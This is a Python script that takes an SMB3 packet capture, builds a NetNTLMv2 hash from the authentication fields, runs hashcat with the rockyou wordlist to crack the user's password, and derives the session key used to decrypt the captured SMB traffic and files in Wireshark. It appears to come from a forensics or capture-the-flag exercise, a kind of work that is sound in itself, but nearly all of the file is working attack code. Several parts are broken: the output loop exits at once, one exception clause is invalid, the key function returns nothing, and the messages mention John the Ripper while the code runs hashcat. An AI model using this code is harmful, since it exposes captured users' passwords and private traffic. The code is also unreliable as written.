import hashlib
import hmac
import argparse
import sys
import subprocess
import itertools
import time

from Crypto.Cipher import ARC4
from Crypto.Hash import MD4
import pyshark

from md4 import MD4
#Imported from https://gist.github.com/kangtastic/c3349fc4f9d659ee362b12d7d8c639b6 as hashlib no longer supports md4.

from SMB3Session import SMB3Session

"""
Program that extracts fields from SMB3 packets in order to craft an NetNTLMv2 hash 
which is cracked via hashcat, with access to a users SMB password the secret key used in
conversation is reconstructed and communications are decrypted.
"""


def extract_packets(pcap):
    #Create a filter to only collect the important smb3 packets for calculating the Random Session Key
    capture = pyshark.FileCapture(pcap, display_filter="ntlmssp.messagetype == 2")
    for packet in capture:
        #print(packet.smb2.ntlmssp_ntlmserverchallenge)
        ntlm_challenge = packet.smb2.ntlmssp_ntlmserverchallenge.replace(':', '')
    # Close the capture
    capture.close()

    capture = pyshark.FileCapture(pcap, display_filter="ntlmssp.messagetype == 3")
    for packet in capture:
	#Issues with endianess make this code more complex than need be
        ba = bytearray.fromhex(packet.smb2.sesid.raw_value)
        print("Session ID = " + (''.join(format(x, '02x') for x in ba)))
        #Extracting necessary fields for NTLM hash.
        username = packet.smb2.ntlmssp_auth_username.replace(':', '')
        domain = packet.smb2.ntlmssp_auth_domain.replace(':', '')
        sesskey = packet.smb2.ntlmssp_auth_sesskey.replace(':', '')
        ntProofStr = packet.smb2.ntlmssp_ntlmv2_response_ntproofstr.replace(':', '')
        ntlmv2response = packet.smb2.ntlmssp_ntlmv2_response.replace(':', '')
    # Close the capture
    capture.close()
    smb3session = SMB3Session(domain, username, sesskey, ntlm_challenge, ntProofStr, ntlmv2response)
    return smb3session

def crack_password(ntlmhashpath):
    #Given the ntlmv2 hash constructed from the smb traffic. Load into hashcat and attempt cracking.
    #Using default wordlist location for Kali linux machines.
    wordlist = "/usr/share/wordlists/rockyou.txt"
    password = ""

    #Maximizes the runtime of the cracking process, if it is the case where it would take much longer to crack. It is best
    # to run the john command seperately to free up system resources.
    runtime = time.time() + 7200

    #Test if wordlist is present at correct location.
    try:
        open(wordlist, 'r')
    except FileNotFoundError:
        print("Wordlist file not at expected location")

    try:
        with open("crackedhash.txt", 'w') as file:
            #Runs the command as sudo, will ask for password if python file not executed as sudo.
            command = ["sudo", "hashcat", "-m" , "5600",  ntlmhashpath, wordlist]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            while True:
                if time.time() > runtime:
                    process.terminate()
                    print("Cracking process has taken longer than 2 hours, attempt john cracking with different options outside the of the script")
                    break
                output = process.stdout.readline()
                if output is not None:
                    break
                outputfix = output.decode("utf-8")
                if "Password Cracked:" in outputfix:
                    print(str(output), "password has been cracked")
                    password = output.split(":")[1].strip()
                    process.terminate()
                    break
            process.wait()
    except FileNotFoundError:
        print("John the ripper not found, see https://www.kali.org/tools/john/ for more details")
    except password == "":
        raise Exception("No password could be found")
    else:
        return password


def generateResponseKeyNT(password, smb3session):
    user = smb3session.get_username().upper().encode('utf-16le')
    domain = smb3session.get_domain().upper().encode('utf-16le')
    hashpass = MD4(password.encode('utf-16le')).bytes()
    h = hmac.new(hashpass, digestmod=hashlib.md5)
    h.update(user+domain)
    return h.digest()

def generateKeyExchangeKey(responseKeyNT, ntProofStr):
    h = hmac.new(responseKeyNT, digestmod=hashlib.md5)
    h.update(bytes.fromhex(ntProofStr))
    return h.digest()

def generateRandomSessionKey(keyExchangeKey, sessionKey):
    cipher = ARC4.new(keyExchangeKey)
    cipher_encrypt = cipher.encrypt
    decryptionKey = cipher_encrypt(bytes.fromhex(sessionKey))
    print("Decryption key found: " + decryptionKey.hex() + "\n")

def main(pcap):
    """Main driver code to execute all other functions.
    Basic program procedure -
    Step 1 - Open pcap file and extract needed fields
    Step 2 - Get password hash and load into hashcat to crack
    Step 3 - Exit out if hash not found in reasonable time, if hash found - generate secret key
    Step 4 - Return secret key and instructions on how to decrypt within Wireshark."""
    #Step 1
    smb3session = extract_packets(pcap)
    #Construct a hash file for hashcat to crack
    with open("hashfile.txt", 'r+') as file:
    	# Write some text to the file
        file.write(smb3session.get_username() + "::")
        file.write(smb3session.get_domain() + ":")
        file.write(smb3session.get_ntlm_challenge() + ":")
        file.write(smb3session.get_ntlm_response()[:32] + ":")
        file.write(smb3session.get_ntlm_response()[32:])
        #Step 2 and 3
        password = crack_password("hashfile.txt")
    #Step 4 - Assemble key
    responseKeyNT = generateResponseKeyNT(password, smb3session)
    keyExchangeKey = generateKeyExchangeKey(responseKeyNT, smb3session.get_ntProofStr())
    generateRandomSessionKey(keyExchangeKey, smb3session.get_sesskey())
    print("To complete decryption in wireshark go to Edit -> Preferences -> Protocols -> SMB2 -> Secret Session Key and add the outputed key here, this should give access to all of that sessions traffic alongside the files transfered")

#Change to location of pcap/pcapng. TODO: Add as cmdline prompt/arguement
main("/home/test/project/smb3v2.pcapng")